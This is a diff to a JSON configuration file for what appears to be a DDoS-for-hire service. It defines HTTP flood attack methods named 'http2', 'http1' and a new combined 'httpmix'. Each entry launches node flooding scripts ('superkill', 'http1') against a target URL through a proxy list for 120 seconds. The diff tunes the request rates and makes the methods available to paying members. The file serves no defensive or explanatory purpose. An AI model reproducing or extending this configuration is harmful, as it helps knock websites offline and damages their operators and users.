@@ -1,15 +1,20 @@
 {
     "http2": {
-        "command": "node --max-old-space-size=65536 superkill -m POST -u url -s 120 -t 10 -r 999 -p live.txt --full true --delay 1 -d false ",
+        "command": "node --max-old-space-size=65536 superkill -m POST -u url -s 120 -t 10 -r 128 -p live.txt -v 2 --full true --delay 1 -d false ",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
     },
     "http1": {
-        "command": "node --max-old-space-size=65536 http1 POST url live.txt 120 999 10 randomstring=true",
+        "command": "node --max-old-space-size=65536 http1 POST url live.txt 120 128 10 randomstring=true",
+        "url": "url",
+        "time": 120,
+        "visibility": "MEMBER"
+    },
+    "httpmix": {
+        "command": "node --max-old-space-size=65536 superkill -m POST -u url -s 120 -t 10 -r 128 -p live.txt -v 2 --full true --delay 1 -d false & node --max-old-space-size=65536 http1 POST url live.txt 120 128 10 randomstring=true",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
     }
 }
- 
